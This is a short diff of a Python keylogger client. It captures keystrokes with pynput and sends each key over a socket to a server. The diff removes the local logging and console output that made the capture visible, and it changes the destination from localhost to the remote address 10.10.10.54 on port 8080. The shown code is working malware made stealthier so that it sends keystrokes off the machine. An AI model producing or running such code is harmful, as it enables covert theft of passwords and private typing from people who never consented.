@@ -1,4 +1,4 @@
-import logging, socket
+import socket
 import sys
 from pynput.keyboard import Key, Listener
 
@@ -46,15 +46,12 @@ class Connection:
 
         while True:
             self.socket.send(bytes(keys, 'utf-8'))
-            print("Keys sent:", keys)
             break
         
 
 
     def onPress(self, key):
         key_data = str(key)
-        logging.debug(f"{key_data}")
-        print(key_data)
         self.send_keys(key_data)
     
     def start(self):
@@ -65,6 +62,5 @@ class Connection:
 
 
 if __name__ == '__main__':
-    logging.basicConfig(level=logging.DEBUG, filename='client_activity.log', format='Time: %(asctime)s | Key: %(message)s')
-    connection = Connection('localhost', 8080)
+    connection = Connection('10.10.10.54', 8080)
     connection.start()
